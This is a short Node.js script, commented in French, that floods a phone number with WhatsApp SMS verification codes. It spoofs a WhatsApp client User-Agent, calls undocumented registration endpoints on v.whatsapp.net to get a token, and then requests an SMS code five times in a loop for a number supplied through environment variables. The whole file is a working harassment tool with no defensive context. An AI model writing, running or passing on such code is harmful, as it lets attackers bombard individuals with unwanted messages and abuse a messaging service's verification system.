// 06_otp.js — flood de code SMS (best effort, endpoints non documentes)
// CC=237 NUM=6XXXXXXXX node 06_otp.js
const https = require('https');

const CC = process.env.CC, NUM = process.env.NUM;
const get = u => new Promise((res, rej) => {
  https.get(u, { headers: { 'User-Agent': 'WhatsApp/2.24.1' } }, r => {
    let d = ''; r.on('data', c => d += c); r.on('end', () => res(d));
  }).on('error', rej);
});

(async () => {
  const exist = await get(`https://v.whatsapp.net/v2/exist?cc=${CC}&phone=${NUM}&sim_mcc=624&sim_mnc=01&method=sms`);
  console.log('exist ->', exist.slice(0, 200));
  const token = (JSON.parse(exist) || {}).login || '';
  for (let i = 1; i <= 5; i++) {
    const r = await get(`https://v.whatsapp.net/v2/code?cc=${CC}&phone=${NUM}&token=${token}&method=sms&sim_mcc=624&sim_mnc=01&hasinrc=1`);
    console.log(`demande ${i} ->`, r.slice(0, 120));
    await new Promise(r => setTimeout(r, 12000));
  }
})();
